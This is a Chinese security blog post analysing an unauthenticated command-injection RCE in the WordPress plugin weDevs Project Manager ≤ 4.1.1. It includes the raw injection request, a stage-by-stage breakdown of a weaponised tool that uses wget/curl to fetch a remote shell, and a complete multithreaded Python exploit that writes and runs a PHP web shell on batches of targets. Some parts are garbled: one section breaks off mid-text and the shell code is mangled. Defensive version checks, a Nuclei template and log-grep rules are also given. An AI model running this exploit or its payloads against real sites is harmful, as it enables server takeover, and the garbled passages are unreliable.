#  【首发】weDevs Project Manager ≤ 4.1.1 未授权 RCE：完整利用链拆解  
原创 mourenzheng
                    mourenzheng  网络安全民工   2026-11-03 22:41  
  
## 一、漏洞定性  
  
weDevs Project Manager 是 WordPress 生态中的项目管理插件。其 REST API 端点 /wp-json/pm/v2/projects/1/update  
 在处理 id  
 参数时存在命令拼接缺陷。攻击者无需任何凭证，只需一个 POST 请求，即可在服务器上执行任意系统命令，并以此为起点写入持久化 Web Shell。  
<table><thead><tr><th data-colwidth="117" style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;background: #f5f5f5;font-weight: 700;"><section><span leaf="">项</span></section></th><th style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;background: #f5f5f5;font-weight: 700;"><section><span leaf="">值</span></section></th></tr></thead><tbody><tr><td data-colwidth="117" style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">漏洞类型</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">命令注入 / 未授权 RCE（CWE-78）</span></section></td></tr><tr><td data-colwidth="117" style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">影响版本</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">weDevs Project Manager </span><strong style="font-weight: bolder;"><span leaf="">≤ 4.1.1</span></strong></section></td></tr><tr><td data-colwidth="117" style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">攻击端点</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><code style="font-family: monospace;background: #f5f5f5;padding: .1em .3em;border-radius: 3px;font-size: .9em;"><span leaf="">POST /wp-json/pm/v2/projects/1/update</span></code></td></tr><tr><td data-colwidth="117" style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">认证要求</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><strong style="font-weight: bolder;"><span leaf="">无</span></strong></td></tr><tr><td data-colwidth="117" style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">利用前置</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">插件已安装启用，REST API 可访问</span></section></td></tr><tr><td data-colwidth="117" style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">利用工具</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">已有完整武器化实现（@Mushr00w）</span></section></td></tr><tr><td data-colwidth="117" style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">CVE 编号</span></section></td><td style="border: 1px solid #ddd;padding: .5em .75em;text-align: left;"><section><span leaf="">标注为 CVE-2026-116512，</span><strong style="font-weight: bolder;"><span leaf="">公开数据库暂无法确认</span></strong></section></td></tr></tbody></table>  
**关于编号的说明**  
：以“weDevs Project Manager ≤ 4.1.1 未授权命令注入”描述，编号待官方确认后再引用。  
## 二、漏洞机制：一个管道符击穿命令边界  
  
核心攻击请求只有一行：  
```
POST /wp-json/pm/v2/projects/1/update HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
id=x|system&title=id
```  
  
插件后端在处理项目更新时，将 id  
 参数拼入 shell 命令（形如 some_tool --project {id} --title {title}  
）。id  
 的值 x|system  
 利用管道符 |  
 截断前半段命令，使 system  
 成为下一条命令，title  
 的值作为 system  
 的参数被执行。x  
 是占位符，确保管道前有合法命令不报错。  
  
这个缺陷的本质是**用户输入未经转义直接进入命令执行上下文**  
。管道符、分号、反引号、_SERVER['DOCUMENT_ROOT']  
从 PHP 环境变量获取fromPhpCwdphp -r 'echo getcwd();'  
PHP 进程的当前目录  
  
四条路径互为补充，去重后得到候选列表。这种多源探测的设计，是为了适配不同的 Web 服务器配置和 PHP 运行模式。  
### 阶段四：多路径写入 Shell  
```
def attemptsFor(self, path):
    yield ('base64', path, 'echo ' + self.encoded + ' | base64 -d > ' + path + ' && echo WROTE')
    yield ('printf', path, "printf '%s' '" + self.escaped + "' > " + path + ' && echo WROTE')
    yield ('php_fpc', path, 'php -r "file_put_contents(...)" && echo WROTE')
    yield ('python', path, "python -c \"import base64;open(...).write(...)\" && echo WROTE")
    yield ('perl', path, "perl -e \"use MIME::Base64;...\" && echo WROTE")
    yield ('wget', path, 'wget -q -O ' + path + ' ' + URL + ' && echo WROTE')
    yield ('curl', path, 'curl -s -o ' + path + ' ' + URL + ' && echo WROTE')
```  
  
对每个 webroot 下的每个可写目录，依次尝试 7 种写入方式：  
- **base64 管道**  
：echo <b64> | base64 -d > shell.php  
  
- **printf 转义**  
：printf '%s' '<escaped>' > shell.php  
  
- **PHP 原生**  
：php -r "file_put_contents(...)"  
  
- **Python 解码**  
：python -c "import base64; open(...).write(...)"  
  
- **Perl 解码**  
：perl -e "use MIME::Base64; ..."  
  
- **wget 拉取**  
：从远程 URL 下载 shell  
  
- **curl 拉取**  
：同上，不同工具  
  
这种“总有一种能成”的设计，是为了适配不同 hardened 环境的命令可用性。写入成功的标志是命令输出含 WROTE  
。  
  
**这一步开始，工具从“检测”滑向“攻击”**  
。它主动在目标服务器上写入文件，这是持久化行为的起点。  
### 阶段五：标记验证  
```
response = requests.get(probe, timeout=(CT, RT), verify=False)
if response.status_code != 200:
    return None
if MARKUPL in response.text:
    return probe
if MARKD7 in response.text:
    return probe
```  
  
写入后，GET 请求该 URL，检查响应是否含 Mushr00w UPLOADER  
 或 D7net  
 标记。**用文件内容标记而非 HTTP 状态码验证**  
，是因为某些配置下不存在的 PHP 文件也可能返回 200（如自定义 404 页面）。这个细节比大多数 PoC 可靠。  
### 阶段六：命令执行验证与结果持久化  
```
execOutput = requests.get(shellUrl + '?Mushr00w=id', timeout=(CT, RT), verify=False).text
if execOutput.strip():
    result.output = execOutput.strip()
    result.rceVerified = 'SHELL EXEC'
```  
  
通过 shell 的 ?Mushr00w=id  
 参数执行 id  
，确认 shell 不仅可访问，而且命令执行功能正常。最终结果写入 success.txt  
：  
```
UPLOADER : http://target/uploads/mushr00w_upl.php
SHELL EXEC : uid=33(www-data) gid=33(www-data) groups=33(www-data)
-----
```  
  
**这个文件本身在取证角度是明确的攻击证据**  
。它记录了目标 URL、写入的 shell 路径、命令输出。  
## 四、POC设计的成熟与缺陷  
  
**成熟之处**  
：  
- 多源 webroot 发现，不依赖单一方法  
  
- 7 种写入路径，适配不同环境  
  
- 用文件内容标记而非状态码验证  
  
- 写入后二次验证命令执行能力  
  
- 支持单目标与批量模式，支持多线程  
  
**缺陷与风险**  
：  
- **性能隐患**  
：对每个 webroot 执行 find {webroot} -type d  
，然后对每个目录尝试 7 种写入方式。大站点上可能跑几十分钟，没有超时控制、没有失败次数上限。  
  
- **远程 shell 依赖**  
：wget  
/curl  
 路径从 https://raw.githubusercontent.com/RoweenTheGod/Shell/...  
 拉取。这个仓库的可用性和内容不受工具使用者控制，是供应链式的单点依赖。  
  
- **全局变量脆弱性**  
：DEBUG  
 和 ATTEMPT  
 的模块级全局变量与 Runner  
 实例状态之间存在隐式依赖，改动时容易出错。  
  
- **武器化本质**  
：默认就写入 shell、执行命令、尝试持久化。在未授权目标上运行它，就是实施攻击。  
  
## 五、如果你要做的是“验证”而不是“攻击”  
  
阶段一和阶段二是安全的验证子集：插件探测 + id  
 命令确认。阶段三之后开始写入文件，已经超出漏洞验证的范畴。  
  
**严格只读的检测**  
只需读 readme.txt  
 的 Stable tag  
：  
```
import requests, re
def check(base):
    url = f"{base.rstrip('/')}/wp-content/plugins/wedevs-project-manager/readme.txt"
    r = requests.get(url, timeout=10, verify=False)
    if r.status_code != 200:
        print("[-] 插件未检测到")
        return
    m = re.search(r"Stable tag:\s*([\d.]+)", r.text, re.I)
    if not m:
        print("[*] 无法解析版本")
        return
    ver = m.group(1)
    print(f"[*] 版本: {ver}")
    if tuple(int(x) for x in ver.split(".")[:3]) <= (4, 1, 1):
        print(f"[!] 版本 {ver} ≤ 4.1.1，可能受影响")
    else:
        print(f"[+] 版本 {ver} 不受影响")
```  
  
**这个版本只读 readme.txt，不发送任何注入载荷**  
。如果要验证注入是否成立，至少使用无害命令（如 id  
），并且只在授权环境中执行。  
## 六、Nuclei 模板（安全指纹版）  
```
id: wedevs-project-manager-version-detect
info:
  name: weDevs Project Manager - Version Fingerprint (Safe)
  author: security-research
  severity: high
  description: |
    仅读取 readme.txt 做版本指纹，不发送命令注入载荷。
  classification:
    cwe-id: CWE-78
  tags: wordpress,wedevs,project-manager,detect
http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/wedevs-project-manager/readme.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Project Manager"
      - type: regex
        part: body
        name: version
        regex:
          - "Stable tag:\\s*(4\\.1\\.1|4\\.[01]\\.\\d|[0-3]\\.\\d+\\.\\d+)"
    extractors:
      - type: regex
        part: body
        name: detected_version
        regex:
          - "Stable tag:\\s*([\\d.]+)"
        group: 1
```  
  
**运行方式**  
：nuclei -t wedevs-pm-detect.yaml -u https://target  
## 七、自查与修复  
  
**确认版本**  
：  
```
# 方法一：读 readme
curl -s https://target/wp-content/plugins/wedevs-project-manager/readme.txt | grep "Stable tag"
# 方法二：后台插件列表
# WordPress 管理后台 → 插件 → 搜索 "Project Manager" → 查看版本号
```  
  
**修复**  
：  
- 若版本 ≤ 4.1.1，升级到最新版本。  
  
- 若官方尚未发布修复，**停用并删除该插件**  
是唯一可靠的缓解。漏洞的触发条件是插件暴露的 REST 端点，没有配置层面的 workaround。  
  
- 检查 Web 服务器日志中是否有向 /wp-json/pm/v2/projects/1/update  
 发送 id  
 参数含管道符、分号、反引号的请求。  
  
**日志排查示例**  
：  
```
grep "pm/v2/projects" /var/log/nginx/access.log | grep -E "id=.*[|;`]"
```  
  
**如果你在评估这个工具**  
：它能工作，但它是一把上了膛的枪，不是一把尺子。阶段二之后的所有操作——webroot 发现、文件写入、持久化 shell——都属于攻击行为。在授权环境中使用它，应清楚每一步的后果；在非授权环境中，不应运行它。  
  
**关于 weDevs Project Manager ≤ 4.1.1 未授权命令注入”完整利用POC**  
```
# -*- coding: utf-8 -*-
import sys
import re
import base64
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
requests.packages.urllib3.disable_warnings()
SHELL_FILE = 'mushr00w_upl.php'
SHELL_MARK = 'Mushr00w UPLOADER'
SHELL_PHP = (
    '<?php if(isset(_GET["Mushr00w"]);exit;}'
    'if(isset(_FILES["f"]["tmp_name"],'
    '_FILES["f"]["name"]);exit;}'
    '?><h2>Mushr00w UPLOADER</h2>'
)
SHELL_B64 = base64.b64encode(SHELL_PHP.encode()).decode()
PATH_RE = re.compile(r"(/[^\s\"']+)")
WPC_RE = re.compile(r"(/[^\s\"']+/wp-config\.php)")
ID_RE = re.compile(r"uid=\d+(\([^)]*\))?")
TIMEOUT = (10, 30)
class Target:
    def __init__(self, raw):
        raw = raw.strip()
        if not raw:
            raise ValueError('empty target')
        if not raw.startswith(('http://', 'https://')):
            raw = 'https://' + raw
        self.base = raw.rstrip('/')
        self.endpoint = self.base + '/wp-json/pm/v2/projects/1/update'
        self.readme = self.base + '/wp-content/plugins/wedevs-project-manager/readme.txt'
class Exploit:
    def __init__(self, target, debug=False):
        self.target = target
        self.debug = debug
    def rce(self, command):
        payload = {'id': 'x|system', 'title': command}
        try:
            r = requests.post(self.target.endpoint, data=payload,
                              timeout=TIMEOUT, verify=False)
        except requests.RequestException as e:
            if self.debug:
                print(f'  [debug] RCE 请求失败: {e}')
            return None
        if self.debug:
            print(f'  [debug] POST {command!r} -> HTTP {r.status_code}, {len(r.content)} bytes')
        return r.text if r.status_code == 200 else None
    def check_plugin(self):
        try:
            r = requests.get(self.target.readme, timeout=TIMEOUT, verify=False)
        except requests.RequestException:
            return False
        return r.status_code == 200 and 'Project Manager' in r.text
    def verify_rce(self):
        body = self.rce('id')
        if not body:
            return None
        if 'uid=' in body or ID_RE.search(body):
            for line in body.splitlines():
                if 'uid=' in line:
                    return line.strip()
            return ID_RE.search(body).group(0)
        return None
    def discover_webroots(self):
        candidates = []
        # 1) wp-config.php 路径
        out = self.rce('find / -maxdepth 6 -name wp-config.php -type f 2>/dev/null | head -1')
        if out:
            m = WPC_RE.search(out)
            if m:
                candidates.append(m.group(1).rsplit('/', 1)[0])
        # 2) pwd
        out = self.rce('pwd')
        if out:
            m = PATH_RE.search(out)
            if m:
                pwd = m.group(1).rstrip('/')
                for marker in ('/wp-admin', '/wp-content', '/wp-includes'):
                    if marker in pwd:
                        candidates.append(pwd.split(marker)[0])
                        break
                candidates.append(pwd)
        # 3) DOCUMENT_ROOT
        out = self.rce("echo $_SERVER['DOCUMENT_ROOT']")
        if out:
            m = PATH_RE.search(out)
            if m:
                candidates.append(m.group(1).rstrip('/'))
        # 4) PHP getcwd
        out = self.rce("php -r 'echo getcwd();'")
        if out:
            m = PATH_RE.search(out)
            if m:
                candidates.append(m.group(1).rstrip('/'))
        # 去重保序
        seen, result = set(), []
        for c in candidates:
            if c and c not in seen:
                seen.add(c)
                result.append(c)
        return result
    def write_shell(self, webroot):
        out = self.rce(f'find {webroot} -type d 2>/dev/null')
        if not out:
            return None
        for directory in PATH_RE.findall(out):
            directory = directory.rstrip('/')
            path = f'{directory}/{SHELL_FILE}'
            cmd = f'echo {SHELL_B64} | base64 -d > {path} && echo WROTE'
            if self.debug:
                print(f'  [debug] 尝试写入 {path}')
            out = self.rce(cmd)
            if not out or 'WROTE' not in out:
                continue
            rel = directory[len(webroot):].lstrip('/')
            probe = f'{self.target.base}/{rel}/{SHELL_FILE}' if rel else f'{self.target.base}/{SHELL_FILE}'
            try:
                r = requests.get(probe, timeout=TIMEOUT, verify=False)
            except requests.RequestException:
                continue
            if r.status_code == 200 and SHELL_MARK in r.text:
                return probe
        return None
    def run(self, upload_shell=False):
        result = {
            'target': self.target.base,
            'plugin': False,
            'vulnerable': False,
            'id_output': '',
            'shell_url': '',
            'shell_exec': '',
        }
        result['plugin'] = self.check_plugin()
        if self.debug:
            print(f'[*] 插件探测: {"存在" if result["plugin"] else "未检测到"}')
        id_out = self.verify_rce()
        if not id_out:
            return result
        result['vulnerable'] = True
        result['id_output'] = id_out
        if self.debug:
            print(f'[+] RCE 验证成功: {id_out}')
        if not upload_shell:
            return result
        webroots = self.discover_webroots()
        if self.debug:
            print(f'[*] webroot 候选: {webroots}')
        for webroot in webroots:
            url = self.write_shell(webroot)
            if url:
                result['shell_url'] = url
                try:
                    r = requests.get(f'{url}?Mushr00w=id', timeout=TIMEOUT, verify=False)
                    if r.text.strip():
                        result['shell_exec'] = r.text.strip()
                except requests.RequestException:
                    pass
                break
        return result
def run_single(url, upload_shell=False, debug=False):
    try:
        target = Target(url)
    except ValueError as e:
        print(f'[-] {e}')
        return
    result = Exploit(target, debug).run(upload_shell)
    print_result(result)
def run_batch(list_file, threads=1, upload_shell=False, debug=False):
    with open(list_file) as f:
        targets = [line.strip() for line in f
                   if line.strip() and not line.startswith('#')]
    if not targets:
        print('[-] 目标列表为空')
        return
    results = []
    if threads <= 1:
        for i, raw in enumerate(targets, 1):
            try:
                target = Target(raw)
            except ValueError:
                continue
            print(f'\n[{i}/{len(targets)}] {target.base}')
            results.append(Exploit(target, debug).run(upload_shell))
    else:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {}
            for raw in targets:
                try:
                    target = Target(raw)
                except ValueError:
                    continue
                futures[ex.submit(Exploit(target, debug).run, upload_shell)] = target.base
            for fut in as_completed(futures):
                try:
                    results.append(fut.result())
                except Exception as e:
                    print(f'[-] 线程异常: {e}')
    vulnerable = [r for r in results if r['vulnerable']]
    shelled = [r for r in results if r['shell_url']]
    print(f'\n总数: {len(results)}  存在漏洞: {len(vulnerable)}  写入 shell: {len(shelled)}')
    for r in shelled:
        print(f'  {r["target"]} -> {r["shell_url"]}')
def print_result(r):
    print(f'\n目标: {r["target"]}')
    print(f'插件: {"存在" if r["plugin"] else "未检测到"}')
    print(f'漏洞: {"存在" if r["vulnerable"] else "未检测到"}')
    if r['id_output']:
        print(f'命令输出: {r["id_output"]}')
    if r['shell_url']:
        print(f'Shell URL: {r["shell_url"]}')
    if r['shell_exec']:
        print(f'Shell 执行: {r["shell_exec"]}')
def parse_args(argv):
    opts = {'url': None, 'list': None, 'threads': 1, 'debug': False, 'shell': False}
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == '-u' and i + 1 < len(argv):
            opts['url'] = argv[i + 1]; i += 1
        elif a == '-l' and i + 1 < len(argv):
            opts['list'] = argv[i + 1]; i += 1
        elif a == '-t' and i + 1 < len(argv):
            opts['threads'] = int(argv[i + 1]); i += 1
        elif a == '-d':
            opts['debug'] = True
        elif a == '-s':
            opts['shell'] = True
        i += 1
    return opts
if __name__ == '__main__':
    opts = parse_args(sys.argv[1:])
    if not opts['url'] and not opts['list']:
        print(f'用法: python {sys.argv[0]} -u <url> | -l <list> [-t threads] [-s] [-d]')
        print('  -s  写入持久化 shell（攻击模式）')
        print('  -d  打印调试信息')
        sys.exit(1)
    if opts['url']:
        run_single(opts['url'], opts['shell'], opts['debug'])
    else:
        run_batch(opts['list'], opts['threads'], opts['shell'], opts['debug'])
```  
  
  
